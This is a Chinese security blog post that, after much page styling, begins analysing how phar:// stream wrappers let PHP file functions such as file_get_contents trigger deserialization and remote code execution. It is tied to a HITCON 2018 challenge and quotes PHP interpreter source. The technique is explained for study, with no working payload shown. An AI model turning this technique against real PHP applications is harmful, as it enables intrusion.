<!DOCTYPE html><html lang="zh-Hans-CN"><head><meta charSet="utf-8" class="next-head"/><title class="next-head">Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx&#x27;s Blog</title><meta name="description" content="今年的HITCON打完了，沉迷写前端搞Nextjs骚操作的我成功爆0（雾），不想写前端了.jp" class="next-head"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/Post.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/_app.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/_error.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/runtime/webpack-f4542de9ce6104e90191.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/chunks/commons.1749661b9c351bfed1da.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/chunks/styles.8fcb23da458518755372.js" as="script"/><link rel="preload" href="https://blog.zsxsoft.com/_next/static/runtime/main-5b31b8367d7796ac13cc.js" as="script"/><link rel="stylesheet" href="https://blog.zsxsoft.com/_next/static/css/commons.5d66bd75.chunk.css"/><link rel="stylesheet" href="https://blog.zsxsoft.com/_next/static/css/styles.684c5820.chunk.css"/><style id="jss-server-side">.jss65 {  width: 40px;  height: 40px;  display: flex;  position: relative;  overflow: hidden;  font-size: 1.25rem;  align-items: center;  flex-shrink: 0;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  user-select: none;  border-radius: 50%;  justify-content: center;}.jss66 {  color: #fafafa;  background-color: #bdbdbd;}.jss67 {  width: 100%;  height: 100%;  text-align: center;  object-fit: cover;}.jss110 {  padding: 16px;}.jss110:last-child {  padding-bottom: 24px;}.jss38 {  background-color: #fff;}.jss39 {  border-radius: 4px;}.jss40 {  box-shadow: none;}.jss41 {  box-shadow: 0px 1px 3px 0px rgba(0,0,0,0.2),0px 1px 1px 0px rgba(0,0,0,0.14),0px 2px 1px -1px rgba(0,0,0,0.12);}.jss42 {  box-shadow: 0px 1px 5px 0px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 3px 1px -2px rgba(0,0,0,0.12);}.jss43 {  box-shadow: 0px 1px 8px 0px rgba(0,0,0,0.2),0px 3px 4px 0px rgba(0,0,0,0.14),0px 3px 3px -2px rgba(0,0,0,0.12);}.jss44 {  box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);}.jss45 {  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 5px 8px 0px rgba(0,0,0,0.14),0px 1px 14px 0px rgba(0,0,0,0.12);}.jss46 {  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.jss47 {  box-shadow: 0px 4px 5px -2px rgba(0,0,0,0.2),0px 7px 10px 1px rgba(0,0,0,0.14),0px 2px 16px 1px rgba(0,0,0,0.12);}.jss48 {  box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);}.jss49 {  box-shadow: 0px 5px 6px -3px rgba(0,0,0,0.2),0px 9px 12px 1px rgba(0,0,0,0.14),0px 3px 16px 2px rgba(0,0,0,0.12);}.jss50 {  box-shadow: 0px 6px 6px -3px rgba(0,0,0,0.2),0px 10px 14px 1px rgba(0,0,0,0.14),0px 4px 18px 3px rgba(0,0,0,0.12);}.jss51 {  box-shadow: 0px 6px 7px -4px rgba(0,0,0,0.2),0px 11px 15px 1px rgba(0,0,0,0.14),0px 4px 20px 3px rgba(0,0,0,0.12);}.jss52 {  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 12px 17px 2px rgba(0,0,0,0.14),0px 5px 22px 4px rgba(0,0,0,0.12);}.jss53 {  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 13px 19px 2px rgba(0,0,0,0.14),0px 5px 24px 4px rgba(0,0,0,0.12);}.jss54 {  box-shadow: 0px 7px 9px -4px rgba(0,0,0,0.2),0px 14px 21px 2px rgba(0,0,0,0.14),0px 5px 26px 4px rgba(0,0,0,0.12);}.jss55 {  box-shadow: 0px 8px 9px -5px rgba(0,0,0,0.2),0px 15px 22px 2px rgba(0,0,0,0.14),0px 6px 28px 5px rgba(0,0,0,0.12);}.jss56 {  box-shadow: 0px 8px 10px -5px rgba(0,0,0,0.2),0px 16px 24px 2px rgba(0,0,0,0.14),0px 6px 30px 5px rgba(0,0,0,0.12);}.jss57 {  box-shadow: 0px 8px 11px -5px rgba(0,0,0,0.2),0px 17px 26px 2px rgba(0,0,0,0.14),0px 6px 32px 5px rgba(0,0,0,0.12);}.jss58 {  box-shadow: 0px 9px 11px -5px rgba(0,0,0,0.2),0px 18px 28px 2px rgba(0,0,0,0.14),0px 7px 34px 6px rgba(0,0,0,0.12);}.jss59 {  box-shadow: 0px 9px 12px -6px rgba(0,0,0,0.2),0px 19px 29px 2px rgba(0,0,0,0.14),0px 7px 36px 6px rgba(0,0,0,0.12);}.jss60 {  box-shadow: 0px 10px 13px -6px rgba(0,0,0,0.2),0px 20px 31px 3px rgba(0,0,0,0.14),0px 8px 38px 7px rgba(0,0,0,0.12);}.jss61 {  box-shadow: 0px 10px 13px -6px rgba(0,0,0,0.2),0px 21px 33px 3px rgba(0,0,0,0.14),0px 8px 40px 7px rgba(0,0,0,0.12);}.jss62 {  box-shadow: 0px 10px 14px -6px rgba(0,0,0,0.2),0px 22px 35px 3px rgba(0,0,0,0.14),0px 8px 42px 7px rgba(0,0,0,0.12);}.jss63 {  box-shadow: 0px 11px 14px -7px rgba(0,0,0,0.2),0px 23px 36px 3px rgba(0,0,0,0.14),0px 9px 44px 8px rgba(0,0,0,0.12);}.jss64 {  box-shadow: 0px 11px 15px -7px rgba(0,0,0,0.2),0px 24px 38px 3px rgba(0,0,0,0.14),0px 9px 46px 8px rgba(0,0,0,0.12);}.jss37 {  overflow: hidden;}.jss21 {  color: inherit;  border: 0;  margin: 0;  cursor: pointer;  display: inline-flex;  outline: none;  padding: 0;  position: relative;  align-items: center;  user-select: none;  border-radius: 0;  vertical-align: middle;  justify-content: center;  -moz-appearance: none;  text-decoration: none;  background-color: transparent;  -webkit-appearance: none;  -webkit-tap-highlight-color: transparent;}.jss21::-moz-focus-inner {  border-style: none;}.jss21.jss22 {  cursor: default;  pointer-events: none;}.jss166 {  color: rgba(0, 0, 0, 0.87);  padding: 6px 16px;  font-size: 0.875rem;  min-width: 64px;  box-sizing: border-box;  transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;  line-height: 1.75;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 500;  border-radius: 4px;  letter-spacing: 0.02857em;  text-transform: uppercase;}.jss166:hover {  text-decoration: none;  background-color: rgba(0, 0, 0, 0.08);}.jss166.jss186 {  color: rgba(0, 0, 0, 0.26);}@media (hover: none) {  .jss166:hover {    background-color: transparent;  }}.jss166:hover.jss186 {  background-color: transparent;}.jss167 {  width: 100%;  display: inherit;  align-items: inherit;  justify-content: inherit;}.jss168 {  padding: 6px 8px;}.jss169 {  color: #2196f3;}.jss169:hover {  background-color: rgba(33, 150, 243, 0.08);}@media (hover: none) {  .jss169:hover {    background-color: transparent;  }}.jss170 {  color: #00b0ff;}.jss170:hover {  background-color: rgba(0, 176, 255, 0.08);}@media (hover: none) {  .jss170:hover {    background-color: transparent;  }}.jss174 {  border: 1px solid rgba(0, 0, 0, 0.23);  padding: 5px 16px;}.jss174.jss186 {  border: 1px solid rgba(0, 0, 0, 0.26);}.jss175 {  color: #2196f3;  border: 1px solid rgba(33, 150, 243, 0.5);}.jss175:hover {  border: 1px solid #2196f3;  background-color: rgba(33, 150, 243, 0.08);}@media (hover: none) {  .jss175:hover {    background-color: transparent;  }}.jss176 {  color: #00b0ff;  border: 1px solid rgba(0, 176, 255, 0.5);}.jss176:hover {  border: 1px solid #00b0ff;  background-color: rgba(0, 176, 255, 0.08);}.jss176.jss186 {  border: 1px solid rgba(0, 0, 0, 0.26);}@media (hover: none) {  .jss176:hover {    background-color: transparent;  }}.jss177 {  color: rgba(0, 0, 0, 0.87);  box-shadow: 0px 1px 5px 0px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 3px 1px -2px rgba(0,0,0,0.12);  background-color: #e0e0e0;}.jss177.jss185 {  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.jss177:active {  box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);}.jss177.jss186 {  color: rgba(0, 0, 0, 0.26);  box-shadow: none;  background-color: rgba(0, 0, 0, 0.12);}.jss177:hover {  background-color: #d5d5d5;}@media (hover: none) {  .jss177:hover {    background-color: #e0e0e0;  }}.jss177:hover.jss186 {  background-color: rgba(0, 0, 0, 0.12);}.jss178 {  color: #fff;  background-color: #2196f3;}.jss178:hover {  background-color: #1976d2;}@media (hover: none) {  .jss178:hover {    background-color: #2196f3;  }}.jss179 {  color: rgba(0, 0, 0, 0.87);  background-color: #00b0ff;}.jss179:hover {  background-color: #0091ea;}@media (hover: none) {  .jss179:hover {    background-color: #00b0ff;  }}.jss183 {  width: 56px;  height: 56px;  padding: 0;  min-width: 0;  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);  border-radius: 50%;}.jss183:active {  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 12px 17px 2px rgba(0,0,0,0.14),0px 5px 22px 4px rgba(0,0,0,0.12);}.jss184 {  width: auto;  height: 48px;  padding: 0 16px;  min-width: 48px;  border-radius: 24px;}.jss187 {  color: inherit;  border-color: currentColor;}.jss188 {  width: 40px;  height: 40px;}.jss189 {  padding: 4px 8px;  min-width: 64px;  font-size: 0.8125rem;}.jss190 {  padding: 8px 24px;  font-size: 0.9375rem;}.jss191 {  width: 100%;}.jss15 {  flex: 0 0 auto;  color: rgba(0, 0, 0, 0.54);  padding: 12px;  overflow: visible;  font-size: 1.5rem;  text-align: center;  transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;  border-radius: 50%;}.jss15:hover {  background-color: rgba(0, 0, 0, 0.08);}.jss15.jss19 {  color: rgba(0, 0, 0, 0.26);}@media (hover: none) {  .jss15:hover {    background-color: transparent;  }}.jss15:hover.jss19 {  background-color: transparent;}.jss16 {  color: inherit;}.jss17 {  color: #2196f3;}.jss17:hover {  background-color: rgba(33, 150, 243, 0.08);}@media (hover: none) {  .jss17:hover {    background-color: transparent;  }}.jss18 {  color: #00b0ff;}.jss18:hover {  background-color: rgba(0, 176, 255, 0.08);}@media (hover: none) {  .jss18:hover {    background-color: transparent;  }}.jss20 {  width: 100%;  display: flex;  align-items: inherit;  justify-content: inherit;}.jss74 {  margin: 0;  display: block;}.jss75 {  color: rgba(0, 0, 0, 0.54);  font-size: 7rem;  font-weight: 300;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.14286em;  margin-left: -.04em;  letter-spacing: -.04em;}.jss76 {  color: rgba(0, 0, 0, 0.54);  font-size: 3.5rem;  font-weight: 400;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.30357em;  margin-left: -.02em;  letter-spacing: -.02em;}.jss77 {  color: rgba(0, 0, 0, 0.54);  font-size: 2.8125rem;  font-weight: 400;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.13333em;  margin-left: -.02em;}.jss78 {  color: rgba(0, 0, 0, 0.54);  font-size: 2.125rem;  font-weight: 400;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.20588em;}.jss79 {  color: rgba(0, 0, 0, 0.87);  font-size: 1.5rem;  font-weight: 400;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.35417em;}.jss80 {  color: rgba(0, 0, 0, 0.87);  font-size: 1.3125rem;  font-weight: 500;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.16667em;}.jss81 {  color: rgba(0, 0, 0, 0.87);  font-size: 1rem;  font-weight: 400;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.5em;}.jss82 {  color: rgba(0, 0, 0, 0.87);  font-size: 0.875rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.5;  letter-spacing: 0.01071em;}.jss83 {  color: rgba(0, 0, 0, 0.87);  font-size: 1rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.5;  letter-spacing: 0.00938em;}.jss84 {  color: rgba(0, 0, 0, 0.87);  font-size: 0.75rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.66;  letter-spacing: 0.03333em;}.jss85 {  color: rgba(0, 0, 0, 0.87);  font-size: 0.875rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 500;  line-height: 1.75;  letter-spacing: 0.02857em;  text-transform: uppercase;}.jss86 {  color: rgba(0, 0, 0, 0.87);  font-size: 6rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 300;  line-height: 1;  letter-spacing: -0.01562em;}.jss87 {  color: rgba(0, 0, 0, 0.87);  font-size: 3.75rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 300;  line-height: 1;  letter-spacing: -0.00833em;}.jss88 {  color: rgba(0, 0, 0, 0.87);  font-size: 3rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.04;  letter-spacing: 0em;}.jss89 {  color: rgba(0, 0, 0, 0.87);  font-size: 2.125rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.17;  letter-spacing: 0.00735em;}.jss90 {  color: rgba(0, 0, 0, 0.87);  font-size: 1.5rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.33;  letter-spacing: 0em;}.jss91 {  color: rgba(0, 0, 0, 0.87);  font-size: 1.25rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 500;  line-height: 1.6;  letter-spacing: 0.0075em;}.jss92 {  color: rgba(0, 0, 0, 0.87);  font-size: 1rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 1.75;  letter-spacing: 0.00938em;}.jss93 {  color: rgba(0, 0, 0, 0.87);  font-size: 0.875rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 500;  line-height: 1.57;  letter-spacing: 0.00714em;}.jss94 {  color: rgba(0, 0, 0, 0.87);  font-size: 0.75rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  font-weight: 400;  line-height: 2.66;  letter-spacing: 0.08333em;  text-transform: uppercase;}.jss95 {  width: 1px;  height: 1px;  position: absolute;  overflow: hidden;}.jss96 {  text-align: left;}.jss97 {  text-align: center;}.jss98 {  text-align: right;}.jss99 {  text-align: justify;}.jss100 {  overflow: hidden;  white-space: nowrap;  text-overflow: ellipsis;}.jss101 {  margin-bottom: 0.35em;}.jss102 {  margin-bottom: 16px;}.jss103 {  color: inherit;}.jss104 {  color: #2196f3;}.jss105 {  color: #00b0ff;}.jss106 {  color: rgba(0, 0, 0, 0.87);}.jss107 {  color: rgba(0, 0, 0, 0.54);}.jss108 {  color: #f44336;}.jss109 {  display: inline;}.jss13 {  top: 0;  left: 0;  right: 0;  bottom: 0;  z-index: 1300;  position: fixed;}.jss14 {  visibility: hidden;}.jss2 {  flex: 0 0 auto;}.jss3 {  top: 0;  flex: 1 0 auto;  height: 100%;  display: flex;  z-index: 1200;  outline: none;  position: fixed;  overflow-y: auto;  flex-direction: column;  -webkit-overflow-scrolling: touch;}.jss4 {  left: 0;  right: auto;}.jss5 {  left: auto;  right: 0;}.jss6 {  top: 0;  left: 0;  right: 0;  bottom: auto;  height: auto;  max-height: 100%;}.jss7 {  top: auto;  left: 0;  right: 0;  bottom: 0;  height: auto;  max-height: 100%;}.jss8 {  border-right: 1px solid rgba(0, 0, 0, 0.12);}.jss9 {  border-bottom: 1px solid rgba(0, 0, 0, 0.12);}.jss10 {  border-left: 1px solid rgba(0, 0, 0, 0.12);}.jss11 {  border-top: 1px solid rgba(0, 0, 0, 0.12);}.jss24 {  fill: currentColor;  width: 1em;  height: 1em;  display: inline-block;  font-size: 24px;  transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;  user-select: none;  flex-shrink: 0;}.jss25 {  color: #2196f3;}.jss26 {  color: #00b0ff;}.jss27 {  color: rgba(0, 0, 0, 0.54);}.jss28 {  color: #f44336;}.jss29 {  color: rgba(0, 0, 0, 0.26);}.jss30 {  font-size: inherit;}.jss31 {  font-size: 20px;}.jss32 {  font-size: 35px;}.jss68 {  display: flex;  padding: 16px;  align-items: center;}.jss69 {  flex: 0 0 auto;  margin-right: 16px;}.jss70 {  flex: 0 0 auto;  align-self: flex-start;  margin-top: -8px;  margin-right: -8px;}.jss71 {  flex: 1 1 auto;}.jss163 {  display: flex;  padding: 8px 4px;  box-sizing: border-box;  align-items: center;}.jss164 {  padding: 8px;}.jss165 {  margin: 0 4px;}.jss146 {  color: rgba(0, 0, 0, 0.87);  cursor: text;  display: inline-flex;  font-size: 1rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1.1875em;  align-items: center;}.jss146.jss149 {  color: rgba(0, 0, 0, 0.38);  cursor: default;}.jss154 {  padding: 6px 0 7px;}.jss155 {  width: 100%;}.jss156 {  font: inherit;  color: currentColor;  width: 100%;  border: 0;  margin: 0;  padding: 6px 0 7px;  display: block;  min-width: 0;  box-sizing: content-box;  background: none;  -webkit-tap-highlight-color: transparent;}.jss156::-webkit-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.jss156::-moz-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.jss156:-ms-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.jss156::-ms-input-placeholder {  color: currentColor;  opacity: 0.42;  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.jss156:focus {  outline: 0;}.jss156:invalid {  box-shadow: none;}.jss156::-webkit-search-decoration {  -webkit-appearance: none;}.jss156.jss149 {  opacity: 1;}label[data-shrink=false] + .jss147 .jss156::-webkit-input-placeholder {  opacity: 0;}label[data-shrink=false] + .jss147 .jss156::-moz-placeholder {  opacity: 0;}label[data-shrink=false] + .jss147 .jss156:-ms-input-placeholder {  opacity: 0;}label[data-shrink=false] + .jss147 .jss156::-ms-input-placeholder {  opacity: 0;}label[data-shrink=false] + .jss147 .jss156:focus::-webkit-input-placeholder {  opacity: 0.42;}label[data-shrink=false] + .jss147 .jss156:focus::-moz-placeholder {  opacity: 0.42;}label[data-shrink=false] + .jss147 .jss156:focus:-ms-input-placeholder {  opacity: 0.42;}label[data-shrink=false] + .jss147 .jss156:focus::-ms-input-placeholder {  opacity: 0.42;}.jss157 {  padding-top: 3px;}.jss158 {  resize: none;  padding: 0;}.jss159 {  height: 1.1875em;}.jss160 {  -moz-appearance: textfield;  -webkit-appearance: textfield;}.jss133 {  position: relative;}label + .jss134 {  margin-top: 16px;}.jss137:after {  left: 0;  right: 0;  bottom: 0;  content: "";  position: absolute;  transform: scaleX(0);  transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;  border-bottom: 2px solid #1976d2;  pointer-events: none;}.jss137.jss135:after {  transform: scaleX(1);}.jss137.jss138:after {  transform: scaleX(1);  border-bottom-color: #f44336;}.jss137:before {  left: 0;  right: 0;  bottom: 0;  content: "\00a0";  position: absolute;  transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;  border-bottom: 1px solid rgba(0, 0, 0, 0.42);  pointer-events: none;}.jss137:hover:not(.jss136):not(.jss135):not(.jss138):before {  border-bottom: 2px solid rgba(0, 0, 0, 0.87);}.jss137.jss136:before {  border-bottom-style: dotted;}@media (hover: none) {  .jss137:hover:not(.jss136):not(.jss135):not(.jss138):before {    border-bottom: 1px solid rgba(0, 0, 0, 0.42);  }}.jss126 {  color: rgba(0, 0, 0, 0.54);  padding: 0;  font-size: 1rem;  font-family: "Roboto", "Helvetica", "Arial", sans-serif;  line-height: 1;}.jss126.jss127 {  color: #1976d2;}.jss126.jss128 {  color: rgba(0, 0, 0, 0.38);}.jss126.jss129 {  color: #f44336;}.jss132.jss129 {  color: #f44336;}.jss115 {  transform-origin: top left;}.jss120 {  top: 0;  left: 0;  position: absolute;  transform: translate(0, 24px) scale(1);}.jss121 {  transform: translate(0, 21px) scale(1);}.jss122 {  transform: translate(0, 1.5px) scale(0.75);  transform-origin: top left;}.jss123 {  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;}.jss124 {  z-index: 1;  transform: translate(12px, 20px) scale(1);  pointer-events: none;}.jss124.jss121 {  transform: translate(12px, 17px) scale(1);}.jss124.jss122 {  transform: translate(12px, 10px) scale(0.75);}.jss124.jss122.jss121 {  transform: translate(12px, 7px) scale(0.75);}.jss125 {  z-index: 1;  transform: translate(14px, 20px) scale(1);  pointer-events: none;}.jss125.jss121 {  transform: translate(14px, 17px) scale(1);}.jss125.jss122 {  transform: translate(14px, -6px) scale(0.75);}.jss111 {  margin: 0;  border: 0;  display: inline-flex;  padding: 0;  position: relative;  min-width: 0;  flex-direction: column;  vertical-align: top;}.jss112 {  margin-top: 16px;  margin-bottom: 8px;}.jss113 {  margin-top: 8px;  margin-bottom: 4px;}.jss114 {  width: 100%;}.jss33 *::selection {  color: #ffffff;}.jss35 {}.jss35 a {  color: #08306b;}.jss35 a:hover {  color: #08519c;}.jss35 a:active {  color: #2171b5;}.jss35 *::selection {  background-color: #4292c6;}.jss36 {  background: rgba(247,251,255, 0.99);}</style><meta charSet="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1"/><meta name="apple-mobile-web-app-status-bar-style" content="#2196f3"/><meta name="msapplication-TileColor" content="#2196f3"/><meta name="theme-color" content="#2196f3"/><meta name="robots" content="noarchive"/><link rel="shortcut icon" href="https://blog.zsxsoft.com/favicon.ico"/><link href="https://blog.zsxsoft.com/_next/static/styles/prism-20181026.css" rel="stylesheet"/><link href="https://blog.zsxsoft.com/_next/static/social-share-20181026/css/share.min.css" rel="stylesheet"/><script>if (window.performance) {window.startTime =performance.now() }</script></head><body><div id="__next"><main><header><button class="jss21 jss15 cb7e70" tabindex="0" type="button" label="Toggle Drawer"><span class="jss20"><svg class="jss24" focusable="false" viewBox="0 0 24 24" aria-hidden="true" role="presentation"><path fill="none" d="M0 0h24v24H0z"></path><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg></span></button></header><section style="opacity:0.95" class="_49f885"><div class="_4be503"><div class="jss38 jss41 jss39 jss37 _0dab51 _18dce1 _5f579c"><h1 class="fb2c6b"><div class="_31cf4c" style="height:150px;background-color:#08306b"><span class="e77edf _023e46">Phar与Stream Wrapper造成PHP RCE的深入挖掘</span></div></h1><div class="_3363fd _01d2e0"><div class="_4ba46d _1b3df4"><div class="jss65 b2a8ab"><img src="https://blog.zsxsoft.com/zb_users/avatar/1.png" class="jss67"/></div><span><span style="float:left">zsx</span><span style="float:right"><time>2018/10/22</time><span> in </span><span>代码分析</span><span> / 1 / 22468</span></span></span></div><div class="_1243a9"><article><p>今年的HITCON打完了，沉迷写前端搞Nextjs骚操作的我成功爆0（雾），不想写前端了.jpg。</p>
<p>先跑个题。<br>HITCON 2016上，?出了一道PHP反序列化。<br>HITCON 2017上，?出了一道Phar + PHP反序列化。<br>HITCON 2018上，?出了一道file_get_contents + Phar + PHP反序列化。<br>让我们期待HITCON 2019的操作（雾。</p>
<h2 id="h2-phar-rce"><a name="Phar RCE" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>Phar RCE</h2><p>今年HITCON上，<code>baby cake</code>这一题，涉及到了今年BlackHat大会上的Sam Thomas分享的<code>File Operation Induced Unserialization via the “phar://” Stream Wrapper</code>这个议题，见：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a> 。它的主要内容是，通过<code>phar://</code>协议对一个<code>phar</code>文件进行文件操作，如<code>file_get_contents</code>，就可以触发反序列化，从而达成RCE的效果。</p>
<p>在文章开头部分，让我先对phar反序列化做一些小小的分析。我们直接阅读PHP源码。在 <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a> 处，其调用了<code>php_var_unserialize</code>。</p>
<pre><code class="language-c">        if (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) {</code></pre>
<p>因此可以构造一个特殊的phar包，使得攻击代码能够被反序列化，从而构造一个POP链。这一部分已经太常见了，CTF比赛中都出烂了，没什么值得继续讨论的。值得关注的是到底为什么<code>file_get_contents</code>能够实现RCE。</p>
<h2 id="h2-stream-api"><a name="Stream API" class="reference-link" href="#"></a><span class="header-link octicon octicon-link"></span>Stream API</h2><p>因此，为解决这个问题，我们需要首先阅读此函数的源码。大概在此处：<a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548">https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548</a> ，重点关注此行：</p>
<pre><code class="language-c">    stream = php_stream_open_wrapper_ex(filename, &quot;rb&quot;,
                (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
                NULL, context);</code></pre>
<p>可以注意，其使用的是php_stream系列API来打开一个文件。阅读PHP的这篇文档：<a href="https://secure.php.net/manual/zh/internals2.ze1.streams.php">Streams API for PHP Extension Authors</a>，可知，Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。而本次事件的主角，也就是phar这个扩展，其就注册了<code>phar://</code>这个stream wrapper。可以使用<code>stream_get_wrapper</code>看到系统内注册了哪一些wrapper，但其余的没什么值得关注的。</p>
<pre><code class="language-php">php &gt; var_dump(stream_get_wrappers());
array(12) {
  [0]=&gt;
  string(5) &quot;https&quot;
  [1]=&gt;
  string(4) &quot;ftps&quot;
  [2]=&gt;
  string(13) &quot;compress.zlib&quot;
  [3]=&gt;
  string(14) &quot;compress.bzip2&quot;
  [4]=&gt;
  string(3) &quot;php&quot;
  [5]=&gt;
  string(4) &quot;file&quot;
  [6]=&gt;
  string(4) &quot;glob&quot;
  [7]=&gt;
  string(4) &quot;data&quot;
  [8]=&gt;
  string(4) &quot;http&quot;
  [9]=&gt;
  string(3) &quot;ftp&quot;
  [10]=&gt;
  string(4) &quot;phar&quot;
  [11]=&gt;
  string(3) &quot;zip&quot;
}</code></pre>
<p>那么，注册一个 stream wrapper，能实现什么功能呢？很容易就能找到其定义：<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132">https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132</a></p>
<pre><code class="language-c">typedef struct _php_stream_wrapper_ops {
    /* open/create a wrapped stream */
    php_stream *(*stream_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
            int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
    /* close/destroy a wrapped stream */
    int (*stream_closer)(php_stream_wrapper *wrapper, php_stream *stream);
    /* stat a wrapped stream */
    int (*stream_stat)(php_stream_wrapper *wrapper, php_stream *stream, php_stream_statbuf *ssb);
    /* stat a URL */
    int (*url_stat)(php_stream_wrapper *wrapper, const char *url, int flags, php_stream_statbuf *ssb, php_stream_context *context);
    /* open a &quot;directory&quot; stream */
    php_stream *(*dir_opener)(php_stream_wrapper *wrapper, const char *filename, const char *mode,
            int options, zend_string **opened_path, php_stream_context *context STREAMS_DC);
    const char *label;
    /* delete a file */
    int (*unlink)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
    /* rename a file */
    int (*rename)(php_stream_wrapper *wrapper, const char *url_from, const char *url_to, int options, php_stream_context *context);
    /* Create/Remove directory */
    int (*stream_mkdir)(php_stream_wrapper *wrapper, const char *url, int mode, int options, php_stream_context *context);
    int (*stream_rmdir)(php_stream_wrapper *wrapper, const char *url, int options, php_stream_context *context);
    /* Metadata handling */
    int (*stream_metadata)(php_stream_wrapper *wrapper, const char *url, int options, void *value, php_stream_context *context);
} php_stream_wrapper_ops;</code></pre>
